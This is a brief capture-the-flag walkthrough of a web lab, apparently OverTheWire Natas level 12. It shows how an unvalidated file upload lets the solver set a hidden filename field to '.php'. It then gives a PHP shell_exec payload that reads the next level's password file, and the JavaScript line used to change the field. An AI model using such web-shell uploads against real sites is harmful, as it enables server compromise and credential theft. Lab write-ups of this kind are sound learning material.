In this lab you are introduced to a simple form where you can choose a file to
upload. I searched up a simple jpeg of pepe to upload. But this file was too
big, the page said that the max file size is 1 KB. I used the imagemagick
command to decrease the size to 50x50 and uploaded it. The web page then gave me
a url and sure enough it was the same image I uploaded. Nothing too exciting
with this web page.

After looking at the source code I can see that there are three values that I
may be able to change. I can change the hidden input element named "filename",
the jpg file that I input, and maybe the $_FILES superglobal.

I was stuck for quite a while just looking at this code. Really the only thing
you can change is the file extension via the hidden input. You cannot edit the
$_FILES variable because it is generated automatically by php. After searching
online for a hint I saw a post saying that we can execute php by changing the
file extension to .php and uploading our own php file. No where does the code
check if you are actually uploading an image.

There are four quick steps:

1. Create a php file locally, I called it natas12.php on my local machine.

<?php

echo shell_exec("cat /etc/natas_webpass/natas13");

2. Upload the file with the form.

3. Change the hidden input filename value with JavaScript:
   document.getElementsByName('filename')[0].value = '.php';

4. Click on the link provided.
